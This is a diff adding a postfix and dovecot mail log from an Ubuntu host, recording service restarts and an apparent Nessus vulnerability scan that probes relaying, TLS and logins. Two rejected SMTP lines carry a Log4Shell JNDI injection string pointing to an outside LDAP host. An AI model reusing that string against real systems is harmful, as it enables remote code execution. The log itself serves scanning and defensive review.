@@ -1,0 +1,1421 @@
+Nov  9 22:46:44 ubuntuA3 postfix/master[5444]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  9 22:46:44 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  9 22:46:44 ubuntuA3 dovecot: Generating Diffie-Hellman parameters for the first time. This may take a while..
+Nov  9 22:46:45 ubuntuA3 dovecot: ssl-build-param: SSL parameters regeneration completed
+Nov  9 23:13:30 ubuntuA3 postfix/smtpd[5753]: connect from localhost[127.0.0.1]
+Nov  9 23:13:30 ubuntuA3 postfix/smtpd[5753]: lost connection after CONNECT from localhost[127.0.0.1]
+Nov  9 23:13:30 ubuntuA3 postfix/smtpd[5753]: disconnect from localhost[127.0.0.1]
+Nov 10 16:12:28 ubuntuA3 postfix/master[5444]: terminating on signal 15
+Nov 10 16:13:20 ubuntuA3 postfix/master[5448]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 10 16:13:20 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 10 18:39:22 ubuntuA3 postfix/master[5448]: terminating on signal 15
+Nov 10 18:53:18 ubuntuA3 postfix/master[5469]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 10 18:53:18 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 10 18:55:29 ubuntuA3 postfix/master[5469]: terminating on signal 15
+Nov 10 18:56:10 ubuntuA3 postfix/master[5475]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 10 18:56:10 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 10 19:07:09 ubuntuA3 postfix/master[5475]: terminating on signal 15
+Nov 10 19:08:04 ubuntuA3 postfix/master[5436]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 10 19:08:04 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 10 19:48:09 ubuntuA3 postfix/master[5442]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 10 19:48:09 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 10 19:56:12 ubuntuA3 postfix/master[5442]: terminating on signal 15
+Nov 11 10:12:30 ubuntuA3 postfix/master[5444]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 11 10:12:30 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 11 10:27:12 ubuntuA3 postfix/master[5444]: terminating on signal 15
+Nov 11 10:28:11 ubuntuA3 postfix/master[5471]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 11 10:28:11 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 11 10:29:59 ubuntuA3 postfix/master[5471]: terminating on signal 15
+Nov 11 12:43:44 ubuntuA3 postfix/master[5443]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 11 12:43:44 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 13 08:14:26 ubuntuA3 postfix/master[5477]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 13 08:14:26 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 13 08:38:29 ubuntuA3 postfix/master[5477]: terminating on signal 15
+Nov 13 08:41:14 ubuntuA3 postfix/master[5448]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov 13 08:41:14 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov 13 08:41:41 ubuntuA3 postfix/master[5448]: terminating on signal 15
+Nov  5 21:51:27 ubuntuA3 postfix/master[5427]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  5 21:51:27 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  5 21:52:11 ubuntuA3 postfix/master[5419]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  5 21:52:11 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  5 21:52:14 ubuntuA3 dovecot: ssl-build-param: SSL parameters regeneration completed
+Nov  5 22:03:01 ubuntuA3 postfix/master[5406]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  5 22:03:01 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  5 22:12:35 ubuntuA3 postfix/master[5432]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  5 22:12:35 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  5 22:14:37 ubuntuA3 postfix/master[5432]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  5 22:14:37 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  5 22:21:42 ubuntuA3 postfix/master[5421]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  5 22:21:42 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  5 22:25:29 ubuntuA3 postfix/master[5435]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  5 22:25:29 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  5 22:26:34 ubuntuA3 postfix/master[5435]: terminating on signal 15
+Nov  5 22:27:13 ubuntuA3 postfix/master[5793]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  5 22:27:13 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 09:30:37 ubuntuA3 postfix/master[5406]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 09:30:37 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 09:41:05 ubuntuA3 postfix/master[5406]: terminating on signal 15
+Nov  6 09:41:44 ubuntuA3 postfix/master[5415]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 09:41:44 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 10:03:58 ubuntuA3 postfix/master[5757]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 10:03:58 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 10:23:24 ubuntuA3 postfix/master[5430]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 10:23:24 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 10:34:55 ubuntuA3 postfix/master[5430]: terminating on signal 15
+Nov  6 10:35:35 ubuntuA3 postfix/master[5543]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 10:35:35 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 11:00:09 ubuntuA3 postfix/master[5543]: terminating on signal 15
+Nov  6 11:00:50 ubuntuA3 postfix/master[5431]: daemon started -- version 2.5.1, configuration /etc/postfix
+Nov  6 11:00:50 ubuntuA3 dovecot: Dovecot v1.0.10 starting up
+Nov  6 11:01:01 ubuntuA3 postfix/smtpd[5551]: connect from unknown[10.43.2.77]
+Nov  6 11:01:01 ubuntuA3 postfix/smtpd[5551]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:01:01 ubuntuA3 postfix/smtpd[5551]: disconnect from unknown[10.43.2.77]
+Nov  6 11:01:33 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:01:33 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:01:34 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:01:35 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:01:35 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:01:40 ubuntuA3 last message repeated 4 times
+Nov  6 11:01:45 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:01:45 ubuntuA3 postfix/smtpd[5551]: connect from unknown[10.43.2.77]
+Nov  6 11:01:45 ubuntuA3 postfix/smtpd[5551]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:01:45 ubuntuA3 postfix/smtpd[5551]: disconnect from unknown[10.43.2.77]
+Nov  6 11:01:45 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:01:51 ubuntuA3 last message repeated 3 times
+Nov  6 11:01:51 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:02:02 ubuntuA3 last message repeated 2 times
+Nov  6 11:02:05 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:02:07 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:02:25 ubuntuA3 last message repeated 9 times
+Nov  6 11:02:25 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:02:26 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:02:30 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:02:30 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:02:33 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:02:33 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:02:34 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:02:39 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:02:40 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:03:01 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:03:06 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:03:11 ubuntuA3 dovecot: pop3-login: Disconnected: method=NTLM, rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:03:15 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:03:30 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:03:30 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:03:30 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:03:34 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:36 ubuntuA3 postfix/smtpd[5657]: lost connection after QUIT from unknown[10.43.2.77]
+Nov  6 11:03:36 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:36 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:36 ubuntuA3 postfix/smtpd[5657]: 247682A81E: client=unknown[10.43.2.77]
+Nov  6 11:03:36 ubuntuA3 postfix/smtpd[5657]: lost connection after RCPT from unknown[10.43.2.77]
+Nov  6 11:03:36 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:36 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: lost connection after EHLO from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: lost connection after EHLO from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <test_2@example.edu>: Relay access denied; from=<test_1@example.edu> to=<test_2@example.edu> proto=SMTP helo=<example.edu>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: lost connection after RCPT from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: lost connection after QUIT from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: lost connection after AUTH from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: lost connection after UNKNOWN from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<nobody@example.edu> to=<nobody@example.edu> proto=SMTP helo=<tenscan>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<> to=<nobody@example.edu> proto=SMTP helo=<example.edu>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: lost connection after RCPT from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<nessus@6mJ1agtP.example.edu> to=<nobody@example.edu> proto=SMTP
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<nessus@localhost> to=<nobody@example.edu> proto=SMTP
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<nessus> to=<nobody@example.edu> proto=SMTP
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5661]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<> to=<nobody@example.edu> proto=SMTP
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<> to=<nobody@example.edu> proto=SMTP
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: Illegal address syntax from unknown[10.43.2.77] in MAIL command: <nessus@142.1.46.123>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<nessus@[142.1.46.123]> to=<nobody@example.edu> proto=SMTP helo=<example.edu>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: Illegal address syntax from unknown[10.43.2.77] in MAIL command: <nessus@142.1.46.123>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: Illegal address syntax from unknown[10.43.2.77] in MAIL command: <nessus@142.1.46.123>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: Illegal address syntax from unknown[10.43.2.77] in MAIL command: <nessus@142.1.46.123>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 554 5.7.1 <nobody@example.edu>: Relay access denied; from=<nessus@[142.1.46.123]> to=<nobody@example.edu> proto=SMTP helo=<example.edu>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: Illegal address syntax from unknown[10.43.2.77] in MAIL command: <nessus@142.1.46.123>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: Illegal address syntax from unknown[10.43.2.77] in MAIL command: <nessus@142.1.46.123>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: warning: Illegal address syntax from unknown[10.43.2.77] in MAIL command: <postmaster@142.1.46.123>
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: lost connection after HELO from unknown[10.43.2.77]
+Nov  6 11:03:37 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:03:40 ubuntuA3 dovecot: pop3-login: Aborted login (tried to use disabled plaintext authentication): rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:03:42 ubuntuA3 postfix/smtpd[5661]: NOQUEUE: reject: RCPT from unknown[10.43.2.77]: 550 5.1.1 <${jndi:ldap://log4shell-smtp-9KuKSY7kdBsp2NxdHU8W${lower:ten}.w.nessus.org/nessus}>: Recipient address rejected: User unknown in local recipient table; from=<${jndi:ldap://log4shell-smtp-9KuKSY7kdBsp2NxdHU8W${lower:ten}.w.nessus.org/nessus}> to=<${jndi:ldap://log4shell-smtp-9KuKSY7kdBsp2NxdHU8W${lower:ten}.w.nessus.org/nessus}> proto=SMTP helo=<tenscan>
+Nov  6 11:03:43 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:03:43 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:03:47 ubuntuA3 postfix/smtpd[5661]: NOQUEUE: reject: VRFY from unknown[10.43.2.77]: 550 5.1.1 <${jndi:ldap://log4shell-smtp-9KuKSY7kdBsp2NxdHU8W${lower:ten}.w.nessus.org/nessus}>: Recipient address rejected: User unknown in local recipient table; from=<${jndi:ldap://log4shell-smtp-9KuKSY7kdBsp2NxdHU8W${lower:ten}.w.nessus.org/nessus}> to=<${jndi:ldap://log4shell-smtp-9KuKSY7kdBsp2NxdHU8W${lower:ten}.w.nessus.org/nessus}> proto=SMTP helo=<tenscan>
+Nov  6 11:04:03 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:04:07 ubuntuA3 postfix/smtpd[5661]: disconnect from unknown[10.43.2.77]
+Nov  6 11:04:14 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:04:22 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:04:22 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:04:26 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:04:26 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:04:26 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:04:26 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:04:27 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123
+Nov  6 11:04:37 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:04:42 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:04:42 ubuntuA3 postfix/smtpd[5657]: lost connection after CONNECT from unknown[10.43.2.77]
+Nov  6 11:04:42 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:05:28 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS
+Nov  6 11:06:06 ubuntuA3 dovecot: pop3-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:13 ubuntuA3 last message repeated 7 times
+Nov  6 11:06:13 ubuntuA3 dovecot: imap-login: Disconnected: rip=10.43.2.77, lip=142.1.46.123, TLS handshake
+Nov  6 11:06:20 ubuntuA3 last message repeated 7 times
+Nov  6 11:06:20 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:20 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:20 ubuntuA3 postfix/smtpd[5657]: warning: TLS library problem: 5657:error:1408A0C1:SSL routines:SSL3_GET_CLIENT_HELLO:no shared cipher:s3_srvr.c:1006:
+Nov  6 11:06:20 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:20 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:20 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:21 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:21 ubuntuA3 postfix/smtpd[5776]: lost connection after HELO from unknown[10.43.2.77]
+Nov  6 11:06:21 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:21 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:06:21 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:21 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:21 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:21 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:22 ubuntuA3 postfix/smtpd[5776]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:22 ubuntuA3 postfix/smtpd[5776]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:22 ubuntuA3 postfix/smtpd[5776]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:22 ubuntuA3 postfix/smtpd[5776]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:22 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: disconnect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5776]: connect from unknown[10.43.2.77]
+Nov  6 11:06:23 ubuntuA3 postfix/smtpd[5657]: connect from unknown[10.43.2.77]
